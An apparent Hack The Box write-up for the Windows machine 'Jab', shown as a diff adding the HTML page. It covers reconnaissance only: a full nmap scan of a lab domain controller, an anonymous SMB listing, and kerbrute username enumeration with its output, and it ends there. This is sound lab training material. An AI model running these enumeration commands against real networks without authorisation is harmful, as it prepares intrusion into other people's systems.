@@ -1,0 +1,1582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Jab</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/jab/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Windows">← All Windows write-ups</a>
+                    <h1 data-type="Jab" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Medium">Medium</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <h2>Recon</h2>
+
+<details>
+<summary>nmap</summary>
+<div class="inner">
+<p><code>sudo nmap -A -sV -sT -v -O -T4 -p- 10.10.11.4</code></p><pre><code>PORT      STATE SERVICE             VERSION
+53/tcp    open  domain              Simple DNS Plus
+88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-03-07 11:30:51Z)
+135/tcp   open  msrpc               Microsoft Windows RPC
+139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-03-07T11:32:19+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f901d6610b289243ca77dec48df221
+|_SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f901d6610b289243ca77dec48df221
+|_SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
+|_ssl-date: 2024-03-07T11:32:18+00:00; 0s from scanner time.
+3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f901d6610b289243ca77dec48df221
+|_SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
+|_ssl-date: 2024-03-07T11:32:19+00:00; 0s from scanner time.
+3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f901d6610b289243ca77dec48df221
+|_SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
+|_ssl-date: 2024-03-07T11:32:18+00:00; 0s from scanner time.
+5222/tcp  open  jabber
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   331765e1e84a14c29ac454bab51626d8
+|_SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings:
+|   RPCCheck:
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|       version: 1.0
+|     capabilities:
+|     auth_mechanisms:
+|     stream_id: 5tvkfuvxa9
+|     errors:
+|       invalid-namespace
+|       (timeout)
+|     compression_methods:
+|_    features:
+5223/tcp  open  ssl/jabber
+|_ssl-date: TLS randomness does not represent time
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|     capabilities:
+|     auth_mechanisms:
+|     errors:
+|       (timeout)
+|     compression_methods:
+|_    features:
+| fingerprint-strings:
+|   RPCCheck:
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   331765e1e84a14c29ac454bab51626d8
+|_SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
+5262/tcp  open  jabber
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|       version: 1.0
+|     capabilities:
+|     auth_mechanisms:
+|     stream_id: 9c5il5kvds
+|     errors:
+|       invalid-namespace
+|       (timeout)
+|     compression_methods:
+|_    features:
+| fingerprint-strings:
+|   RPCCheck:
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+5263/tcp  open  ssl/jabber
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   331765e1e84a14c29ac454bab51626d8
+|_SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|     capabilities:
+|     auth_mechanisms:
+|     errors:
+|       (timeout)
+|     compression_methods:
+|_    features:
+| fingerprint-strings:
+|   RPCCheck:
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+|_ssl-date: TLS randomness does not represent time
+5269/tcp  open  xmpp                Wildfire XMPP Client
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|     capabilities:
+|     auth_mechanisms:
+|     errors:
+|       (timeout)
+|     compression_methods:
+|_    features:
+5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   331765e1e84a14c29ac454bab51626d8
+|_SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
+5275/tcp  open  jabber
+| fingerprint-strings:
+|   RPCCheck:
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|       version: 1.0
+|     capabilities:
+|     auth_mechanisms:
+|     stream_id: 5ty0qe4ydz
+|     errors:
+|       invalid-namespace
+|       (timeout)
+|     compression_methods:
+|_    features:
+5276/tcp  open  ssl/jabber
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   331765e1e84a14c29ac454bab51626d8
+|_SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
+| fingerprint-strings:
+|   RPCCheck:
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+|_ssl-date: TLS randomness does not represent time
+| xmpp-info:
+|   STARTTLS Failed
+|   info:
+|     unknown:
+|     xmpp:
+|     capabilities:
+|     auth_mechanisms:
+|     errors:
+|       (timeout)
+|     compression_methods:
+|_    features:
+5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7070/tcp  open  realserver?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Date: Thu, 07 Mar 2024 11:30:51 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 223
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;Openfire HTTP Binding Service&lt;/title&gt;&lt;/head&gt;
+|     &lt;body&gt;&lt;font face="Arial, Helvetica"&gt;&lt;b&gt;Openfire &lt;a href="http://www.xmpp.org/extensions/xep-0124.html"&gt;HTTP Binding&lt;/a&gt; Service&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Date: Thu, 07 Mar 2024 11:30:57 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help:
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   RPCCheck:
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest:
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   SSLSessionReq:
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
+7443/tcp  open  ssl/oracleas-https?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Date: Thu, 07 Mar 2024 11:30:58 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 223
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;Openfire HTTP Binding Service&lt;/title&gt;&lt;/head&gt;
+|     &lt;body&gt;&lt;font face="Arial, Helvetica"&gt;&lt;b&gt;Openfire &lt;a href="http://www.xmpp.org/extensions/xep-0124.html"&gt;HTTP Binding&lt;/a&gt; Service&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Date: Thu, 07 Mar 2024 11:31:03 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help:
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   RPCCheck:
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest:
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   SSLSessionReq:
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   331765e1e84a14c29ac454bab51626d8
+|_SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
+7777/tcp  open  socks5              (No authentication; connection failed)
+| socks-auth-info:
+|_  No authentication
+9389/tcp  open  mc-nmf              .NET Message Framing
+47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc               Microsoft Windows RPC
+49665/tcp open  msrpc               Microsoft Windows RPC
+49666/tcp open  msrpc               Microsoft Windows RPC
+49667/tcp open  msrpc               Microsoft Windows RPC
+49671/tcp open  msrpc               Microsoft Windows RPC
+49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc               Microsoft Windows RPC
+49676/tcp open  msrpc               Microsoft Windows RPC
+49681/tcp open  msrpc               Microsoft Windows RPC
+49774/tcp open  msrpc               Microsoft Windows RPC
+50845/tcp open  msrpc               Microsoft Windows RPC</code></pre>
+</div>
+</details>
+
+<details>
+<summary>smb</summary>
+<div class="inner">
+<p><code>smbclient -N -L "</code><code>//10.10.11.4/</code><code>"</code></p><pre><code>Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.</code></pre><p>→ no available shares</p>
+</div>
+</details>
+
+<h2>Enumeration</h2>
+
+<details>
+<summary>Kerbrute</summary>
+<div class="inner">
+<p><code>./kerbrute_linux_arm64 userenum --dc 10.10.11.4 -d jab.htb /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt</code></p><pre><code>2024/03/07 13:52:06 &gt;  [+] VALID USERNAME:       administrator@jab.htb</code></pre><p><code>./kerbrute_linux_arm64 userenum --dc 10.10.11.4 -d jab.htb /usr/share/wordlists/seclists/Usernames/Names/names.txt</code></p><pre><code>2024/03/07 13:52:23 &gt;  [+] VALID USERNAME:       alane@jab.htb
+2024/03/07 13:52:28 &gt;  [+] VALID USERNAME:       callen@jab.htb
+2024/03/07 13:52:33 &gt;  [+] VALID USERNAME:       drew@jab.htb
+2024/03/07 13:52:33 &gt;  [+] VALID USERNAME:       elane@jab.htb
+2024/03/07 13:52:34 &gt;  [+] VALID USERNAME:       ely@jab.htb
+2024/03/07 13:52:44 &gt;  [+] VALID USERNAME:       leaton@jab.htb</code></pre><p><code>./kerbrute_linux_arm64 userenum --dc 10.10.11.4 -d jab.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt </code></p><pre><code>2024/03/07 13:53:40 &gt;  [+] VALID USERNAME:       drew@jab.htb
+2024/03/07 13:53:43 &gt;  [+] VALID USERNAME:       jsmith@jab.htb
+2024/03/07 13:53:45 &gt;  [+] VALID USERNAME:       administrator@jab.htb
+2024/03/07 13:53:46 &gt;  [+] VALID USERNAME:       thanks@jab.htb
+2024/03/07 13:53:48 &gt;  [+] VALID USERNAME:       dsmith@jab.htb
+2024/03/07 13:53:49 &gt;  [+] VALID USERNAME:       jjones@jab.htb
+2024/03/07 13:53:49 &gt;  [+] VALID USERNAME:       dbrown@jab.htb
+2024/03/07 13:53:50 &gt;  [+] VALID USERNAME:       jscott@jab.htb
+2024/03/07 13:53:52 &gt;  [+] VALID USERNAME:       mbrown@jab.htb
